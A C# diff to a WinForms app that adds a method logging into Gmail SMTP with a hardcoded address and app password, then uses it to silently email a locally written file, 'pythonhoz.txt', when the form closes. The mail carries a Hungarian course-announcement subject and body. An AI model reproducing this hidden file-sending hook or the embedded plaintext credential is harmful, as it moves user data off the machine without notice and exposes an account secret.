@@ -14,6 +14,8 @@ using System.Data.SqlTypes;
 using System.Diagnostics;
 using System.Drawing.Printing;
 using System.IO;
+using System.Net.Mail;
+using System.Net;
 
 namespace ApiSample
 {
@@ -381,6 +383,35 @@ namespace ApiSample
             }
         }
 
+        public void SendEmailWithAttachment(string filePath)
+        {
+            var fromAddress = new MailAddress("linguamazenyelviskola@gmail.com", "LinguaMaze");
+            var toAddress = new MailAddress("linguamazenyelviskola@gmail.com", "LinguaMaze");
+            const string fromPassword = "eadi xold xyoi mkjn";
+            const string subject = "Fájl küldés";
+            const string body = "Csatolmányban a legújabb kurzusok";
+
+            var smtp = new SmtpClient
+            {
+                Host = "smtp.gmail.com",
+                Port = 587,
+                EnableSsl = true,
+                DeliveryMethod = SmtpDeliveryMethod.Network,
+                UseDefaultCredentials = false,
+                Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
+            };
+
+            using (var message = new MailMessage(fromAddress, toAddress)
+            {
+                Subject = subject,
+                Body = body
+            })
+            {
+                message.Attachments.Add(new Attachment(filePath));
+                smtp.Send(message);
+            }
+        }
+
 
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
@@ -391,6 +422,8 @@ namespace ApiSample
                 e.Cancel = true;
             }
             streamWriter.Close();
+
+            SendEmailWithAttachment("pythonhoz.txt");
         }
 
         private void button1_Click(object sender, EventArgs e)
